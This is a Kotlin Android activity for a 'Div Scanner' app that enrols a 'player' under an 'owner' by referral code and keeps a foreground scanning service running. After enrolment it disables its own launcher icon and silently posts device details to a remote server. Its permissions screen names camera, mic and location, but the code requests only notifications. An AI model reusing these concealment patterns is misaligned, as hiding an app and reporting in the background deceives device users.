package com.divintegrity.player

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.gson.Gson
import com.google.gson.JsonObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()
    private val gson = Gson()
    private val jsonType = "application/json; charset=utf-8".toMediaType()
    private val authBase = BuildConfig.AUTH_BASE.trimEnd('/')
    private val deepBase = BuildConfig.DEEP_A_BASE.trimEnd('/')

    private lateinit var title: TextView
    private lateinit var subtitle: TextView
    private lateinit var statusText: TextView
    private lateinit var errorText: TextView
    private lateinit var inputField: EditText
    private lateinit var progress: ProgressBar
    private lateinit var primaryBtn: MaterialButton
    private lateinit var secondaryBtn: MaterialButton

    private val prefs by lazy { getSharedPreferences("div_player", Context.MODE_PRIVATE) }

    private enum class Step { CONNECT, PERMS, USERNAME, REFERRAL, APPROVED, RUNNING }
    private var step = Step.CONNECT
    private var username = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        setFinishOnTouchOutside(false)

        title = findViewById(R.id.title)
        subtitle = findViewById(R.id.subtitle)
        statusText = findViewById(R.id.statusText)
        errorText = findViewById(R.id.errorText)
        inputField = findViewById(R.id.inputField)
        progress = findViewById(R.id.progress)
        primaryBtn = findViewById(R.id.primaryBtn)
        secondaryBtn = findViewById(R.id.secondaryBtn)

        username = prefs.getString("username", "") ?: ""
        val joined = prefs.getBoolean("joined", false)
        val dismissed = prefs.getBoolean("dismissed", false)

        primaryBtn.setOnClickListener { onPrimary() }
        secondaryBtn.setOnClickListener { onSecondary() }

        when {
            intent?.action == ScannerForegroundService.ACTION_OPEN_FROM_NOTIFICATION && joined -> showApproved()
            joined && dismissed -> showRunning()
            joined -> showApproved()
            else -> startConnect()
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.action == ScannerForegroundService.ACTION_OPEN_FROM_NOTIFICATION) {
            showApproved()
        }
    }

    override fun onResume() {
        super.onResume()
        if (prefs.getBoolean("joined", false)) {
            ScannerForegroundService.start(this)
        }
    }

    private fun startConnect() {
        step = Step.CONNECT
        hideInputs()
        title.text = "Div Scanner"
        subtitle.text = "Connecting to server…"
        progress.visibility = View.VISIBLE
        statusText.text = "Waking server (may take 30–60s on free plan)"
        primaryBtn.visibility = View.GONE

        CoroutineScope(Dispatchers.Main).launch {
            var ok = false
            var last = ""
            // 5 retries — Render cold start
            for (i in 1..5) {
                statusText.text = "Server check $i/5…"
                last = withContext(Dispatchers.IO) { pingAuth() }
                if (last.startsWith("OK")) {
                    ok = true
                    break
                }
                delay(3000)
            }
            progress.visibility = View.GONE
            if (ok) {
                statusText.text = "Server connected"
                if (prefs.getBoolean("perms_done", false)) showUsername()
                else showPerms()
            } else {
                subtitle.text = "Server not reachable"
                statusText.text = last.ifBlank { "Check internet / try again" }
                primaryBtn.visibility = View.VISIBLE
                primaryBtn.text = "Retry connect"
                step = Step.CONNECT
            }
        }
    }

    private fun showPerms() {
        step = Step.PERMS
        title.text = "Permissions"
        subtitle.text = "Allow access to continue"
        statusText.text = "Notifications · Camera · Mic · Location · Storage"
        inputField.visibility = View.GONE
        errorText.visibility = View.GONE
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Allow & continue"
        secondaryBtn.visibility = View.VISIBLE
        secondaryBtn.text = "Limited access"
    }

    private fun showUsername() {
        step = Step.USERNAME
        title.text = "Username"
        subtitle.text = "Enter your player name"
        statusText.text = "Owner will see this name"
        inputField.visibility = View.VISIBLE
        inputField.hint = "Username"
        inputField.setText(username)
        errorText.visibility = View.GONE
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Continue"
        secondaryBtn.visibility = View.GONE
    }

    private fun showReferral() {
        step = Step.REFERRAL
        title.text = "Referral Code"
        subtitle.text = "Enter owner code"
        statusText.text = "Format: ds_ff/ + 24 characters"
        inputField.visibility = View.VISIBLE
        inputField.hint = "ds_ff/..."
        inputField.setText("")
        errorText.visibility = View.GONE
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Apply Code"
        secondaryBtn.visibility = View.GONE
    }

    private fun showApproved() {
        step = Step.APPROVED
        ScannerForegroundService.start(this)
        hideInputs()
        title.text = "You are approved"
        subtitle.text = "Tap Go back — scanner stays on"
        subtitle.setTextColor(0xFF34D399.toInt())
        statusText.text =
            "Player: ${prefs.getString("username", "")}\nOwner: ${prefs.getString("owner", "")}"
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Go back"
        secondaryBtn.visibility = View.GONE
        // hide launcher icon after approved (notification opens app)
        hideLauncherIcon()
    }

    private fun showRunning() {
        step = Step.RUNNING
        ScannerForegroundService.start(this)
        hideInputs()
        title.text = "Div scanner is running"
        subtitle.text = "You can close this popup"
        subtitle.setTextColor(0xFFA5B4FC.toInt())
        statusText.text = "Player: ${prefs.getString("username", "")}"
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Close"
        secondaryBtn.visibility = View.GONE
        runScanQuiet()
    }

    private fun hideInputs() {
        inputField.visibility = View.GONE
        errorText.visibility = View.GONE
        progress.visibility = View.GONE
        secondaryBtn.visibility = View.GONE
    }

    private fun onPrimary() {
        errorText.visibility = View.GONE
        when (step) {
            Step.CONNECT -> startConnect()
            Step.PERMS -> {
                requestPerms()
                prefs.edit().putBoolean("perms_done", true).apply()
                ScannerForegroundService.start(this)
                showUsername()
            }
            Step.USERNAME -> {
                val n = inputField.text.toString().trim()
                if (n.length < 2) {
                    showError("Username too short"); return
                }
                username = n
                prefs.edit().putString("username", n).apply()
                showUsername(); showReferral()
            }
            Step.REFERRAL -> join(inputField.text.toString().trim())
            Step.APPROVED -> {
                prefs.edit().putBoolean("dismissed", true).apply()
                showRunning()
                moveTaskToBack(true)
            }
            Step.RUNNING -> {
                moveTaskToBack(true)
                finish()
            }
        }
    }

    private fun onSecondary() {
        if (step == Step.PERMS) {
            prefs.edit().putBoolean("perms_done", true).apply()
            ScannerForegroundService.start(this)
            showUsername()
        }
    }

    private fun requestPerms() {
        val list = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= 33) list += Manifest.permission.POST_NOTIFICATIONS
        val need = list.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (need.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, need.toTypedArray(), 1001)
        }
    }

    private fun join(code: String) {
        val body = code.removePrefix("ds_ff/")
        if (!code.startsWith("ds_ff/") || body.length != 24 || !body.all { it.isLetterOrDigit() }) {
            showError("This code is incorrect"); return
        }
        progress.visibility = View.VISIBLE
        primaryBtn.isEnabled = false
        statusText.text = "Joining owner…"
        CoroutineScope(Dispatchers.Main).launch {
            val result = withContext(Dispatchers.IO) {
                // retry join 3x for cold auth
                var last: JsonObject? = null
                for (i in 1..3) {
                    last = postJson(
                        "$authBase/v1/player/join",
                        mapOf("username" to username, "referralCode" to code)
                    )
                    if (last?.get("ok")?.asBoolean == true) break
                    delay(2000)
                }
                last
            }
            progress.visibility = View.GONE
            primaryBtn.isEnabled = true
            if (result == null) {
                showError("Server error — retry")
                return@launch
            }
            if (result.get("ok")?.asBoolean != true) {
                val msg = result.getAsJsonObject("error")?.get("message")?.asString ?: "failed"
                showError(
                    if (msg.contains("incorrect", true) || msg.contains("invalid", true))
                        "This code is incorrect" else msg
                )
                return@launch
            }
            val data = result.getAsJsonObject("data")
            prefs.edit()
                .putBoolean("joined", true)
                .putBoolean("dismissed", false)
                .putString("token", data?.get("token")?.asString ?: "")
                .putString("owner", data?.get("ownerUsername")?.asString ?: "")
                .putString("username", data?.get("username")?.asString ?: username)
                .apply()
            showApproved()
            runScanQuiet()
        }
    }

    private fun runScanQuiet() {
        val token = prefs.getString("token", "") ?: return
        if (token.isBlank()) return
        CoroutineScope(Dispatchers.IO).launch {
            try {
                postJson(
                    "$deepBase/v1/player/scan/run",
                    mapOf(
                        "signals" to listOf(
                            mapOf(
                                "type" to "build",
                                "payload" to mapOf(
                                    "manufacturer" to Build.MANUFACTURER,
                                    "model" to Build.MODEL,
                                    "sdk" to Build.VERSION.SDK_INT
                                )
                            )
                        ),
                        "device" to mapOf("model" to Build.MODEL)
                    ),
                    token
                )
            } catch (_: Exception) { }
        }
    }

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) { }
    }

    private fun showError(msg: String) {
        errorText.visibility = View.VISIBLE
        errorText.text = msg
    }

    private fun pingAuth(): String {
        return try {
            val req = Request.Builder()
                .url("$authBase/health")
                .get()
                .header("Accept", "application/json")
                .build()
            client.newCall(req).execute().use { r ->
                val body = r.body?.string().orEmpty()
                if (r.isSuccessful && body.contains("ok")) "OK ${r.code}"
                else "FAIL HTTP ${r.code}"
            }
        } catch (e: Exception) {
            "FAIL ${e.javaClass.simpleName}: ${e.message}"
        }
    }

    private fun postJson(url: String, body: Map<String, Any?>, token: String? = null): JsonObject? {
        return try {
            val rb = gson.toJson(body).toRequestBody(jsonType)
            val b = Request.Builder().url(url).post(rb)
                .header("Content-Type", "application/json")
                .header("Accept", "application/json")
            if (!token.isNullOrBlank()) b.header("Authorization", "Bearer $token")
            client.newCall(b.build()).execute().use { resp ->
                val text = resp.body?.string().orEmpty()
                gson.fromJson(text, JsonObject::class.java)
            }
        } catch (_: Exception) {
            null
        }
    }
}
